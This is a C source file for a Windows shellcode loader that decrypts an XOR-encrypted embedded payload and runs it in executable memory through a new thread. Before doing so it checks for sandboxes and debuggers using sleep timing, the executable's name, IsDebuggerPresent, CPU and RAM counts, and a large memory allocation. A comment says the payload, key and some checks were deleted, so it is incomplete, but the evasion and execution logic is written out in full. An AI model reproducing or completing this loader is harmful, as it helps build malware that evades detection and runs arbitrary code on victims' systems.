//parts of this code have been removed for ethical reasons

//include header files
#include <windows.h> //Windows API
#include <stdio.h> //Input/output library
#include <stdlib.h> //Memory allocation
#include <string.h> //String manipulation
#include <time.h> //String manipulation
#pragma comment (lib, "winmm.lib") 
//encrypted payload

//****deleted****

//Decryption key

//****deleted****

//decrypt deXOR function
//XOR each element of the data array with the corresponding element of the key array. The key array is repeated as needed to cover the entire data array.
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

typedef LPVOID(WINAPI* pVirtualAllocExNuma) (
    HANDLE         hProcess,
    LPVOID         lpAddress,
    SIZE_T         dwSize,
    DWORD          flAllocationType,
    DWORD          flProtect,
    DWORD          nndPreferred
    );


//Resource check
BOOL checkResources() {
    SYSTEM_INFO s;
    MEMORYSTATUSEX ms;
    DWORD procNum;
    DWORD ram;

    //Check number of processors is greater than 2
    GetSystemInfo(&s);
    procNum = s.dwNumberOfProcessors; //Find the number of processors in the system.
    if (procNum < 2) return false;

    // check if RAM is less than 2GB
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms); //Get information about the system's memory status.
    ram = ms.ullTotalPhys / 1024 / 1024 / 1024; //Calculate the total physical RAM in gigabytes
    if (ram < 2) return false;

    return true;
}

int main(int argc, char* argv[]) {
    void* my_payload_mem; //Memory buffer for payload
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    //Allocate and fill 1000 MB of memory
    char* mem = NULL;
    mem = (char*)malloc(1000000000); //Allocates a block of memory ~1000 MB in size

    //Time tricks
    DWORD mesure1;
    DWORD mesure2;
    mesure1 = timeGetTime();
    Sleep(1000);
    mesure2 = timeGetTime();

    if (mem != NULL) {
        if ((mesure2 > (mesure1 + 1000)) && (mesure2 < (mesure1 + //****deleted****
            ))) //Checks if the time difference between mesure1 and meaure2 is ****deleted****
        {
            //Check if the executable's name contains ****deleted****
            if (strstr(argv[0], //****deleted****"
                ) == NULL) {

                return -2;
            }

            //Check if any debugger is present
            if (IsDebuggerPresent()) {

                return -2;
            }


            //Check resources
            if (checkResources() == false) {

                return -2;
            }
            memset(mem, 00, 1000000000); //clears the allocated memory
            free(mem); //frees the allocated memory

            //Allocate a memory buffer for payload
            my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            //Decrypt the payload using the XOR function
            XOR((char*)buf, my_payload_len, my_secret_key, sizeof(my_secret_key));

            //Copy the decrypted payload to the new buffer
            RtlMoveMemory(my_payload_mem, buf, my_payload_len);

             //Make the new buffer executable
            rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
            if (rv != 0) {

                //Run the payload
                th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
                WaitForSingleObject(th, -1);
            }
        }
    }
    return 0;
}
